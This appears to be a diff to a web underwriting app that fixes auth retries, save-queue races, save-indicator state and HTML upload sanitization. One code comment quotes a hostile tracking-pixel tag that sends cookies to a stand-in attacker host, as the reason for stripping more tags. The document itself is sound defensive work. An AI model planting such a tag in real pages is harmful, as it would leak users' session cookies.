@@ -209,15 +209,11 @@ function extractRayId(headers, bodySnippet) {
 }
 
 async function llmProxyFetch(body, extraHeaders) {
-  const { data: { session } } = await sb.auth.getSession();
-  if (!session) throw new Error('Not signed in');
-
-  const headers = {
-    'Content-Type': 'application/json',
-    'Authorization': 'Bearer ' + session.access_token
-  };
-  if (extraHeaders) {
-    for (const k in extraHeaders) headers[k] = extraHeaders[k];
+  // Initial session check so we fail fast if the user isn't signed in at all.
+  // Per-attempt session refresh happens inside the retry loop (see F4 below).
+  {
+    const { data: { session: initialSession } } = await sb.auth.getSession();
+    if (!initialSession) throw new Error('Not signed in');
   }
 
   // Pre-compute payload size for telemetry. JSON.stringify is the same call
@@ -241,6 +237,26 @@ async function llmProxyFetch(body, extraHeaders) {
     let parsed = null;
     let status = 0;
     let networkErr = null;
+
+    // Phase 10.5 F4: refresh the Supabase session on EACH attempt so the
+    // Authorization header carries a fresh access_token. Cloudflare 403 retries
+    // schedule at 5s/15s/30s plus a 2-minute per-attempt timeout — total can
+    // exceed 3 minutes worst-case. JWT expiry mid-retry would otherwise turn
+    // an otherwise-recoverable pipeline call into a hard non-retriable
+    // AUTH_ERROR. sb.auth.getSession() consults the local cached session and
+    // is cheap when the token is still valid; auto-refreshes when it isn't.
+    const { data: { session } } = await sb.auth.getSession();
+    if (!session) {
+      // Mid-flight sign-out or refresh failure — abort cleanly with a clear error.
+      throw new Error('Session expired during retry');
+    }
+    const headers = {
+      'Content-Type': 'application/json',
+      'Authorization': 'Bearer ' + session.access_token
+    };
+    if (extraHeaders) {
+      for (const k in extraHeaders) headers[k] = extraHeaders[k];
+    }
 
     // Per-attempt timeout via AbortController. Without this, a hung proxy
     // could pin a single attempt forever and we'd never get to retry.
@@ -728,6 +744,20 @@ const STATE = {
 // ============================================================================
 let SAVE_DEBOUNCE = null;
 let LAST_SAVE_TS = 0;
+// Phase 10.5 F7: separate flag so the 10s setInterval(updateSaveIndicator)
+// doesn't overwrite "Save failed" with "Saved Xs ago" — LAST_SAVE_TS used
+// to be set BEFORE the await in saveEditsNow, so on failure the indicator
+// would correctly flip to "Save failed" briefly and then get clobbered by
+// the next interval tick. Now LAST_SAVE_TS only updates on success and
+// updateSaveIndicator respects LAST_SAVE_FAILED first.
+let LAST_SAVE_FAILED = false;
+// Phase 10.5 F6 / Their #3: serialization primitive for saveEditsNow. Every
+// invocation chains behind the previous one, so a debounced save in flight
+// when the user clicks Revert / Clear / New-Submission can't land its upsert
+// AFTER our cloud-row deletes (which would resurrect just-deleted edits).
+// flushEditsNow drains the chain — used by the revert/clear/restore/
+// new-submission/rehydrate paths before they mutate cloud state.
+let SAVE_QUEUE = Promise.resolve();
 
 // Load edits scoped to the most recent pipeline run.
 //
@@ -754,18 +784,36 @@ function applyPendingEditsIfMatch(pipelineRunId) {
 }
 
 async function saveEditsNow() {
+  // Phase 10.5 F6 / Their #3: chain behind any in-flight save. Multiple rapid
+  // edits used to fire saveEditsNow concurrently — the second invocation
+  // could read a stale view of STATE.edits relative to the first's upsert.
+  // Worse: a Revert clicked while a save was in flight could complete its
+  // sbDeleteEdit before the in-flight upsert landed, resurrecting the edit.
+  // SAVE_QUEUE chains all invocations strictly in order. flushEditsNow drains
+  // it before mutating cloud state.
+  const prev = SAVE_QUEUE;
+  const promise = (async () => {
+    // Don't let an earlier failed save propagate as a rejection through the
+    // chain — we want subsequent saves to still run.
+    await prev.catch(() => {});
+    return _doSaveEditsNow();
+  })();
+  SAVE_QUEUE = promise;
+  return promise;
+}
+
+// Internal: the actual save body. Runs serialized via SAVE_QUEUE.
+async function _doSaveEditsNow() {
   // In-memory edits are persisted two ways for resilience:
   //   1) Baked into the active submission's snapshot (see archiveCurrentSubmission
   //      / rehydrateSubmission) so a reload restores cleanly.
   //   2) Per-module rows in Supabase `submission_edits` so admin views and
   //      multi-device access work.
   //
-  // Now async + awaited: the save indicator shows "Saving…" until the cloud
-  // write actually resolves, then flips to "Saved just now". Previously the
-  // indicator flipped to "Saved" optimistically before the network round-trip
-  // — misleading during testing and a real risk if the user refreshed in
-  // the gap. The visible UI now reflects actual persistence state.
-  LAST_SAVE_TS = Date.now();
+  // Phase 10.5 F7: LAST_SAVE_TS only updates on SUCCESS. The 10s
+  // setInterval(updateSaveIndicator) reads LAST_SAVE_FAILED first now —
+  // otherwise the next tick after a failure would say "Saved Xs ago" because
+  // LAST_SAVE_TS was set at the start (pre-await) of the save attempt.
   const submissionId = STATE.activeSubmissionId;
   if (!submissionId) return;   // nothing to persist yet (no archived submission)
   try {
@@ -774,6 +822,8 @@ async function saveEditsNow() {
       STATE.pipelineRun || null,
       STATE.edits, STATE.customCards, STATE.hiddenCards
     );
+    LAST_SAVE_TS = Date.now();
+    LAST_SAVE_FAILED = false;
     const ind = document.getElementById('saveIndicator');
     const txt = document.getElementById('saveIndicatorText');
     if (ind && txt) {
@@ -784,16 +834,38 @@ async function saveEditsNow() {
     }
   } catch (e) {
     console.warn('Edit save failed', e);
+    LAST_SAVE_FAILED = true;
     const ind = document.getElementById('saveIndicator');
     const txt = document.getElementById('saveIndicatorText');
     if (ind && txt) {
       ind.classList.remove('saving');
+      ind.classList.remove('saved');
       // Don't flip to "saved" on failure — leave the dirty signal so user
       // knows their work isn't safe.
       txt.textContent = 'Save failed';
     }
     toast('Save failed · ' + (e.message || 'network'), 'error');
   }
+}
+
+// Phase 10.5 F6 / Their #3: drain the save queue. Called by revert / clear /
+// restore / new-submission / rehydrate paths BEFORE they mutate cloud state.
+// Pattern:
+//   1) clearTimeout the debounce so a pending save doesn't fire after we drain
+//   2) if there were pending edits, fire saveEditsNow (which queues onto SAVE_QUEUE)
+//   3) await SAVE_QUEUE so any in-flight save (including the one we just queued)
+//      settles before the caller proceeds to delete cloud rows
+async function flushEditsNow() {
+  if (SAVE_DEBOUNCE) {
+    clearTimeout(SAVE_DEBOUNCE);
+    SAVE_DEBOUNCE = null;
+    // Force a save now since the debounce timer was about to. saveEditsNow
+    // adds itself to SAVE_QUEUE, which we await below.
+    saveEditsNow();
+  }
+  // Wait for whatever's in flight (including a save we may have just queued).
+  // .catch swallows so a previously-failed save doesn't reject our await.
+  await SAVE_QUEUE.catch(() => {});
 }
 
 // Debounced save — called on every edit
@@ -806,7 +878,10 @@ function markDirty() {
     txt.textContent = 'Saving…';
   }
   clearTimeout(SAVE_DEBOUNCE);
-  SAVE_DEBOUNCE = setTimeout(saveEditsNow, 450);
+  SAVE_DEBOUNCE = setTimeout(() => {
+    SAVE_DEBOUNCE = null;
+    saveEditsNow();
+  }, 450);
 }
 
 // Phase 8.5 Round 4 fix #2: resync the active submission's snapshot to current
@@ -861,6 +936,18 @@ function updateSaveIndicator() {
   const ind = document.getElementById('saveIndicator');
   const txt = document.getElementById('saveIndicatorText');
   if (!ind || !txt) return;
+  // Phase 10.5 F7: failure state wins over the timestamp-derived "Saved Xs ago"
+  // text. The 10s interval tick was overwriting "Save failed" because
+  // LAST_SAVE_TS used to be set at save START not save SUCCESS — even after a
+  // failure, the next tick would compute a recent timestamp and say "Saved
+  // just now." Now LAST_SAVE_TS only updates on success and we check the
+  // explicit failure flag here.
+  if (LAST_SAVE_FAILED) {
+    ind.classList.remove('saving');
+    ind.classList.remove('saved');
+    txt.textContent = 'Save failed';
+    return;
+  }
   if (LAST_SAVE_TS === 0) {
     txt.textContent = 'Ready';
     return;
@@ -897,9 +984,15 @@ async function clearAllEdits() {
   // If any of the three fails, the user sees an error toast instead of the
   // misleading success toast that fired pre-fix.
   let cloudOk = true;
+  // Phase 10.5 F6: drain any in-flight save AND clear any pending debounce
+  // timer BEFORE issuing sbDeleteAllEditsForSubmission. Same race shape as
+  // revertCard — without flushEditsNow, an upsert from an earlier markDirty
+  // could land AFTER our delete-all and resurrect rows. flushEditsNow also
+  // queues a final saveEditsNow against the post-clear empty state, which is
+  // a no-op upsert (no rows) but ensures the SAVE_QUEUE chain is settled.
   try {
-    await saveEditsNow();
-  } catch (e) { cloudOk = false; console.warn('clearAllEdits: saveEditsNow failed', e); }
+    await flushEditsNow();
+  } catch (e) { cloudOk = false; console.warn('clearAllEdits: flushEditsNow failed', e); }
   // Also delete remote submission_edits rows for this submission. saveEditsNow's
   // upsert path has nothing to write when local state is empty, so without
   // this delete the orphan rows would resurrect on next rehydrate.
@@ -1314,7 +1407,12 @@ async function extractText(file, metadata) {
     meta.kind = 'html';
     const tmp = document.createElement('div');
     tmp.innerHTML = await file.text();
-    tmp.querySelectorAll('script, style, noscript, iframe').forEach(el => el.remove());
+    // Phase 10.5 F12: strip image/source/embed/object/link too. Detached div
+    // images don't reliably trigger src GETs in modern Chrome/Firefox, but
+    // older Safari did and the spec is fuzzy. A hostile uploaded HTML file
+    // could include <img src="https://attacker/track?cookie=..."> as a
+    // tracking pixel. Cheap to close.
+    tmp.querySelectorAll('script, style, noscript, iframe, img, source, embed, object, link').forEach(el => el.remove());
     return (tmp.innerText || tmp.textContent || '').replace(/\n{3,}/g, '\n\n').trim();
   }
 
@@ -2145,7 +2243,12 @@ async function archiveCurrentSubmission(opts) {
     customCards:    deepClone(STATE.customCards),
     hiddenCards:    deepClone(STATE.hiddenCards),
     handoff:        deepClone(STATE.handoff),
-    audit:          STATE.audit.slice(),            // shallow is fine, events are flat
+    // Phase 10.5 F1: STATE.audit is no longer snapshot-bound. The cloud
+    // audit_events table (written by sbLogAuditEvent on every logAudit call)
+    // is the single source of truth for audit history. Snapshotting STATE.audit
+    // into every submission caused (a) O(n²) storage bloat from duplicate
+    // copies and (b) cross-submission contamination when rehydrate replaced
+    // STATE.audit with another submission's snapshot.
     runTotalCost:   STATE.runTotalCost || 0,
     pipelineRun:    STATE.pipelineRun
   };
@@ -2296,7 +2399,7 @@ function displayAccount(rec) {
 // Pull a submission's snapshot back into the workbench. Before doing so,
 // save the currently-active submission's state so the UW doesn't lose
 // anything when hopping between submissions.
-function rehydrateSubmission(submissionId) {
+async function rehydrateSubmission(submissionId) {
   const rec = STATE.submissions.find(s => s.id === submissionId);
   if (!rec || !rec.snapshot) {
     toast('Could not load submission — snapshot missing', 'error');
@@ -2315,19 +2418,21 @@ function rehydrateSubmission(submissionId) {
   if (STATE.activeSubmissionId && STATE.activeSubmissionId !== submissionId) {
     const activeRec = STATE.submissions.find(s => s.id === STATE.activeSubmissionId);
     if (activeRec && STATE.pipelineDone) {
-      // Phase 8.5 round 3 fix #4: flush any pending debounced edit save
-      // BEFORE snapshotting. Without this, an edit made within the 450ms
-      // debounce window before the user clicks a different submission would
-      // race: the snapshot captures the new edit, but submission_edits still
-      // holds the OLD edit (because the debounce hasn't fired yet). Then on
-      // later rehydrate, sbLoadEdits overlays the stale cloud row on top of
-      // the fresh snapshot edit, silently losing the edit. Cancelling the
-      // timer and calling saveEditsNow() synchronously here forces the cloud
-      // edit row to match the snapshot before we move on.
-      if (SAVE_DEBOUNCE) {
-        clearTimeout(SAVE_DEBOUNCE);
-        SAVE_DEBOUNCE = null;
-        if (typeof saveEditsNow === 'function') saveEditsNow();
+      // Phase 10.5 F3: AWAIT the pre-switch flush so the SAVE_QUEUE chain
+      // settles BEFORE we snapshot + swap. The earlier comment-described race
+      // (Phase 8.5 round 3 fix #4) was correctly identified — pending
+      // debounced save needed to flush before snapshotting — but the fix was
+      // fire-and-forget, which didn't actually prevent the race.
+      // flushEditsNow handles three things in one call: clears the debounce
+      // timer, queues a final saveEditsNow if needed, and awaits SAVE_QUEUE.
+      // NOTE: per Phase 8.5 fix #1, we deliberately do NOT call saveEditsNow
+      // AFTER loading the target snapshot (it would race against the cloud
+      // overlay sbLoadEdits and could write stale snapshot edits over fresher
+      // cloud rows). Pre-switch flush only.
+      try {
+        await flushEditsNow();
+      } catch (e) {
+        console.warn('rehydrateSubmission: pre-switch flushEditsNow failed', e);
       }
       // Refresh snapshot with any edits the UW made to the active submission
       activeRec.snapshot = {
@@ -2337,7 +2442,8 @@ function rehydrateSubmission(submissionId) {
         customCards:    deepClone(STATE.customCards),
         hiddenCards:    deepClone(STATE.hiddenCards),
         handoff:        deepClone(STATE.handoff),
-        audit:          STATE.audit.slice(),
+        // Phase 10.5 F1: STATE.audit is no longer snapshot-bound. Cloud
+        // audit_events is the source of truth.
         runTotalCost:   STATE.runTotalCost || 0,
         pipelineRun:    STATE.pipelineRun
       };
@@ -2383,7 +2489,11 @@ function rehydrateSubmission(submissionId) {
   STATE.customCards   = deepClone(snap.customCards || []);
   STATE.hiddenCards   = deepClone(snap.hiddenCards || {});
   STATE.handoff       = deepClone(snap.handoff || { status: null, viewAs: 'uw', history: [] });
-  STATE.audit         = (snap.audit || []).slice();
+  // Phase 10.5 F1: STATE.audit is session-local now. Don't restore from snapshot.
+  // The cloud audit_events table holds the per-submission history (admins can
+  // filter by submission_id in the Admin → Audit panel). Keeping STATE.audit
+  // accumulating across the session is closer to user mental model ("the audit
+  // log shows what's happened") than wiping it on every submission switch.
   STATE.runTotalCost  = snap.runTotalCost || 0;
   STATE.pipelineRun   = snap.pipelineRun || rec.pipelineRun;
   STATE.pipelineDone  = true;
@@ -4081,9 +4191,21 @@ Named Insured ✔ · Effective ✔ · Requested ✔ · Operations ✔ · States 
 // AUDIT LOG — every LLM call, file event, export action
 // ============================================================================
 function logAudit(actor, action, meta) {
+  // Phase 10.5 F2: normalize meta to a string at push time. Phase 10's structured
+  // logging passes meta as an object (status/latency/ray_id/etc.). The in-app
+  // audit pane renderer does escapeHtml(e.meta) which calls String(meta) →
+  // '[object Object]' for any object — making the most diagnostically valuable
+  // events unreadable in the local pane. Cloud-side sbLogAuditEvent does its
+  // own JSON.stringify on the original meta (see supabase-data.js), so the
+  // cloud row is unaffected by this normalization.
+  let metaForLocal = meta;
+  if (metaForLocal != null && metaForLocal !== '—' && typeof metaForLocal !== 'string') {
+    try { metaForLocal = JSON.stringify(metaForLocal); }
+    catch (e) { metaForLocal = String(metaForLocal); }
+  }
   STATE.audit.push({
     time: new Date().toISOString().slice(11, 19),
-    actor, action, meta: meta || '—',
+    actor, action, meta: metaForLocal || '—',
     ts: Date.now()
   });
   renderAuditIfOpen();
@@ -4921,10 +5043,15 @@ function deleteCard(mid) {
 async function revertCard(mid) {
   if (!confirm('Revert ' + (MODULES[mid] ? MODULES[mid].name : mid) + ' to original AI output? All your edits to this card will be lost.')) return;
   delete STATE.edits[mid];
-  // Now awaited: the toast at the end reflects whether cloud cleanup AND
-  // snapshot resync both succeeded. Previously fire-and-forget — the
-  // optimistic "Reverted to original" toast could fire even if the cloud
-  // delete failed and the edit would resurrect on next refresh.
+  // Phase 10.5 F6: drain any in-flight save BEFORE issuing the cloud-row delete.
+  // Without this, a saveEditsNow that fired from an earlier markDirty (debounce
+  // timer already fired, upsert in flight to Supabase) could land its upsert
+  // AFTER sbDeleteEdit completes — resurrecting the just-reverted card on next
+  // refresh. flushEditsNow clears any pending debounce, queues a final save
+  // reflecting the post-delete local state (no card:mid row), and awaits the
+  // entire SAVE_QUEUE chain to settle.
+  await flushEditsNow();
+
   let cloudOk = true;
   const sid = STATE.activeSubmissionId;
   if (sid && typeof sbDeleteEdit === 'function') {
@@ -4936,6 +5063,9 @@ async function revertCard(mid) {
       if (typeof logAudit === 'function') logAudit('Edits', 'Cloud revert FAILED for ' + mid + ' · ' + (e.message || e), 'error');
     }
   }
+  // markDirty here is intentional — it refreshes the save indicator UI but does
+  // NOT race against our delete because flushEditsNow already drained the queue
+  // and any save it triggers reflects the post-delete state.
   markDirty();
   renderSummaryCards();
   // Resync snapshot so reload doesn't resurrect the reverted edit. Awaited
@@ -4961,11 +5091,14 @@ async function restoreAllCards() {
   // rows on top of the snapshot).
   const hiddenIds = Object.keys(STATE.hiddenCards || {});
   STATE.hiddenCards = {};
-  // Now awaited end-to-end: each hidden:<id> row delete must complete, AND
-  // the snapshot resync must complete, before the success toast fires.
-  // Previously the deletes fire-and-forget — could leave stale hidden rows
-  // in the cloud that would re-hide the cards on refresh.
+  // Phase 10.5 F6: drain any in-flight save before issuing parallel deletes.
+  // Without this, a saveEditsNow in flight from an earlier markDirty would
+  // upsert hidden:<id> rows AFTER our deletes complete, re-hiding the cards
+  // we just restored.
   let cloudOk = true;
+  try {
+    await flushEditsNow();
+  } catch (e) { cloudOk = false; console.warn('restoreAllCards: flushEditsNow failed', e); }
   const sid = STATE.activeSubmissionId;
   if (sid && hiddenIds.length > 0 && typeof sbDeleteEdit === 'function') {
     // Run deletes in parallel but await them all before continuing.
@@ -5555,7 +5688,17 @@ document.querySelectorAll('.tab').forEach(t => t.addEventListener('click', () =>
 
 // New submission entry point — archives the currently-loaded submission (if any)
 // then clears state and opens the workbench for a fresh one.
-function startNewSubmission() {
+async function startNewSubmission() {
+  // Phase 10.5 Their #3: drain the SAVE_QUEUE before mutating any STATE.*. A
+  // pending debounced save (or save in flight) would otherwise fire AFTER our
+  // wipe and write empty edits over the previous submission's cloud rows.
+  // Same race shape as F3 (rehydrateSubmission) and F6 (revertCard) — same
+  // primitive solves all three.
+  try {
+    await flushEditsNow();
+  } catch (e) {
+    console.warn('startNewSubmission: pre-reset flushEditsNow failed', e);
+  }
   // Save any in-flight edits to the active submission before wiping
   if (STATE.activeSubmissionId && STATE.pipelineDone) {
     const activeRec = STATE.submissions.find(s => s.id === STATE.activeSubmissionId);
@@ -5567,7 +5710,8 @@ function startNewSubmission() {
         customCards:    deepClone(STATE.customCards),
         hiddenCards:    deepClone(STATE.hiddenCards),
         handoff:        deepClone(STATE.handoff),
-        audit:          STATE.audit.slice(),
+        // Phase 10.5 F1: STATE.audit is no longer snapshot-bound. Cloud
+        // audit_events is the source of truth.
         runTotalCost:   STATE.runTotalCost || 0,
         pipelineRun:    STATE.pipelineRun
       };
@@ -5614,7 +5758,10 @@ function startNewSubmission() {
   STATE.edits = {};
   STATE.hiddenCards = {};
   STATE.customCards = [];
-  STATE.audit = [];
+  // Phase 10.5 F1: STATE.audit is session-local now. Don't wipe it on every
+  // new submission — let it accumulate as the session activity log. The cloud
+  // audit_events table holds the per-submission history (admins can filter
+  // by submission_id in Admin → Audit).
   STATE.runTotalCost = 0;
   STATE._pendingEdits = null;   // drop any stashed prior-session edits
   // Phase 4: edits no longer live in localStorage — they're in Supabase
@@ -5726,10 +5873,20 @@ function showStage(stage) {
   }
 }
 
-function toast(msg) {
+function toast(msg, kind) {
+  // Phase 10.5 Their #4: kind argument was being silently dropped. 49 call
+  // sites pass 'warn' / 'error' / 'success' but the function ignored it, so
+  // every toast looked identical regardless of severity. The class suffix
+  // lets app.css differentiate via the existing --warning / --danger /
+  // --success palette variables (no new theme colors). Falls back to plain
+  // .toast for legacy single-arg callers.
   const w = document.getElementById('toastWrap');
   const t = document.createElement('div');
-  t.className = 'toast';
+  // Normalize known kinds; ignore anything else so a stray third arg or typo
+  // doesn't paint the toast invisibly.
+  const knownKinds = new Set(['info', 'warn', 'error', 'success']);
+  const safeKind = (kind && knownKinds.has(String(kind))) ? String(kind) : null;
+  t.className = 'toast' + (safeKind ? ' toast-' + safeKind : '');
   t.textContent = msg;
   w.appendChild(t);
   setTimeout(() => { t.style.opacity = '0'; t.style.transition = 'opacity 0.3s'; }, 2600);
